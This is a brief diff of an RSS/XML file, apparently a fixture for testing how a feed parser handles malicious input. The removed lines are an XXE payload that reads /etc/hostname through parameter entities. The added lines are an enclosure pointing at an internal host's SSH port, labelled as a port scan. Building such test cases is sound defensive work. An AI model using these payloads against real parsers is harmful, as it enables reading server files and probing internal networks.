@@ -1,13 +1,8 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE root [
-    <!ENTITY % file SYSTEM "file:///etc/hostname">
-    <!ENTITY % error "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
-    %error;
-    %exfil;
-]>
 <rss version="2.0">
   <channel>
-    <title>Impact Analysis</title>
-    <item><title>Test</title></item>
+    <item>
+      <title>Port Scan</title>
+      <enclosure url="http://192.168.1.15:22/" length="1000" type="audio/mpeg"/>
+    </item>
   </channel>
 </rss>
